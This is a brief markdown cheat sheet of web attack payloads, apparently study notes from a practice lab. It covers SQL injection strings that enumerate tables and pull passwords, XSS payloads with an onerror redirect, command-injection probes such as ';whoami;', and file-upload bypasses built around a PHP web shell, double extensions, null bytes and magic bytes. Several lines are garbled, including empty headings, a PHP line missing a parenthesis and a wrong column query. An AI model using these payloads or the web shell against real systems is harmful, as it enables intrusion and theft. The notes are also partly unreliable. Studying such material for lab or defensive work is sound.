# Web Exploitation

## SQL injection

    - Jeremy'
    - Jeremy"
    - Jeremy' or 1=1#
    - Jeremy' or 1=1-- -

### Union Keywords

### Finding out the numbers of columns

### Version of the database
    - Jeremy' union select null,null,version()#
    
### All tables that exists in the database 
    - Jeremy' union select null,null,table_name from information_schema.tables#
### Columns name that exists
    - Jeremy' union select null,null,table_name from information_schema.columns#

### Getting information from a column of a table
    - jeremy' union select null,null,password from injection0x01


## XSS:Cross Site Scripting

### Execute javascript into victims browser
    - Reflected
    - Stored
    - DOM based [No request to the server, vulnerability on client side javascript]

### Simple tesing payloads

    - Alert(1)
    - Print()
    - Prompt("hello")

### DOM based common payloads
    - <img src=x onerror="prompt(1)">
    - <img src=x onerror="window.location.href='http://google.com/'">

### Stored based payloads

## Command Injection

### Basic Payloads
    - ;whoami; asd | grep
    - Which bash ; asd | grep <-- to check which bash is running 
    - Which PHP
    - Which python

## File Upload Vulnerabilities

### Case 1
        1. Upload the file 
        2. Look at the request in burp
        3. Change the content type parameter to php and add the command after deleting the content --> <?php system($_GET['cmd']; ?>
        4. Navigate to the php file
        5. Execure system commands
        6. ?cmd = whoami
    
### Case 2 
        1. The check of the file Is now happening serverside
        2.  Payloads to bypass the serverside checks
            a. Logo3.php.png
            b. Logo3.php%00.png (Null byte attack)
            c. .htaccess file
            d. Magic Bytes --> few characters that tell the system what kind of file it is
    Add the php payload in between the file content to bypass the magic bytes check
